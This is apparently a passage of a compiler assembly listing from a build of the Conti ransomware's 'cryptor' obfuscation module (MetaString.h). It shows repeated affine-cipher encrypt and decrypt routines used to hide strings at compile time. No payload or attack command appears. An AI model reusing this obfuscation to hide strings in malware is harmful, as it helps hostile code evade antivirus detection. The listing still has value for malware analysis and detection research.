  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 46	 add	 r8d, 70			; 00000046H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0HB@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<113,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0HB@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0HB@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<113,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0HB@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<113,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DL@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DL@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<59,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 13	 sub	 eax, 19
  00006	44 6b c0 1c	 imul	 r8d, eax, 28

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DL@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<59,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DL@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DL@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<59,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 3b	 imul	 r8d, eax, 59		; 0000003bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 13	 add	 r8d, 19
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DL@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<59,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DL@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DL@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<59,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DL@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<59,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CL@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CL@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<43,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 50 00 00 00	 mov	 ecx, 80			; 00000050H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3e	 imul	 r8d, ecx, 62		; 0000003eH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CL@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<43,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CL@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CL@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<43,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 2b	 imul	 r8d, eax, 43		; 0000002bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 50	 add	 r8d, 80			; 00000050H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CL@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<43,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CL@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CL@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<43,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CL@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<43,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EJ@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EJ@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<73,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 55 00 00 00	 mov	 ecx, 85			; 00000055H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 89	 lea	 r8d, DWORD PTR [rcx+rcx*4]
  00013	41 c1 e0 03	 shl	 r8d, 3

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EJ@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<73,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EJ@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EJ@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<73,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 49	 imul	 r8d, eax, 73		; 00000049H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 55	 add	 r8d, 85			; 00000055H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EJ@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<73,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EJ@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EJ@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<73,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EJ@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<73,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BD@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BD@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<19,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 76 00 00 00	 mov	 ecx, 118		; 00000076H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 89	 lea	 r8d, DWORD PTR [rcx+rcx*4]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BD@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<19,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BD@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BD@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<19,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 13	 imul	 r8d, eax, 19
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 76	 add	 r8d, 118		; 00000076H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BD@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<19,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BD@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BD@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ PROC ; MetaBuffer<19,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BD@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<19,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0L@$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 0b 00 00 00	 mov	 ecx, 11
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 17	 imul	 r8d, ecx, 23

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0L@$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0L@$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	ff c0		 inc	 eax
  00005	44 6b c0 0b	 imul	 r8d, eax, 11
  00009	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000e	41 f7 e0	 mul	 r8d
  00011	41 8b c8	 mov	 ecx, r8d
  00014	2b ca		 sub	 ecx, edx
  00016	d1 e9		 shr	 ecx, 1
  00018	03 ca		 add	 ecx, edx
  0001a	c1 e9 06	 shr	 ecx, 6
  0001d	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00020	44 2b c1	 sub	 r8d, ecx
  00023	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00027	c3		 ret	 0
?encrypt@?$MetaBuffer@$0L@$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0L@$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
